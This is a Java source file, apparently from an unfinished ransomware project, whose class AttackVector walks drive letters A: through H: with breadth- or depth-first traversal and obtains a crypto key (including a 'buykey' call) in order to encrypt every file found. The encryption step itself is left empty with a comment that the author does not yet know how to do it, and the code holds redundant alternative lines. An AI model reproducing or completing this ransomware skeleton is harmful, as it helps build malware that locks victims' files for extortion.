package Agent.Attack;

import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Map;

import Agent.EncryptionAlgo.CryptoAlgorithm;
import Agent.entites.AlgorithmsMap;
import Agent.entites.CryptoKey;
import Agent.exceptions.RansomwareException;
import Agent.services.KeyService;
import Agent.traversal.*;
import kotlin.jvm.functions.Function3;

public class AttackVector {

	public void cryptFileSystem(boolean isPaid) throws RansomwareException {

		Traverse<File> dfs = new DFS<File>();
		Traverse<File> bfs = new BFS<File>(); 

		CryptoKey key;
		KeyService keyService = new KeyService();
		key = keyService.getKey();
			//or
		key = keyService.buykey();
		Collection<File> visitedFolders = new ArrayList<File>();

		for (char i = 'A'; i <= 'H'; i++) {

			traverseAndCrypt(i + ":\\", visitedFolders, key, bfs);
			// or
			traverseAndCrypt(i + ":\\", visitedFolders, key, dfs);
		}

	}

	private CryptoAlgorithm getCryptClass(Map<String, CryptoAlgorithm> algorithmMap, String className) {
		return algorithmMap.get(className);
	}

	// Check if specific directory is already found in the folder tree
	private boolean isVisitedFolder(File file, Collection<File> folderTree) {

		return folderTree.stream().parallel().anyMatch(t -> t.equals(file));
	}

	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse<File> struct) {

		CryptoAlgorithm crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());

		struct.add(new File(inputDir));
		while (!(struct.isEmpty())) {
			/* get next file/directory */
			File current = (File) struct.remove();

			File[] fileDirList = current.listFiles();

			if (fileDirList != null) {
				for (File file : fileDirList) {
					if (file.isDirectory()) {

						if (!(isVisitedFolder(file, dirs))) {
							dirs.add(file);
							struct.add(file);
						}

					} else if (file.isFile()) {

						//  Still has no clue what to do 
						// with the encrypt/decrypt thing
						
						
					}
				}
			}

		}
	}
}
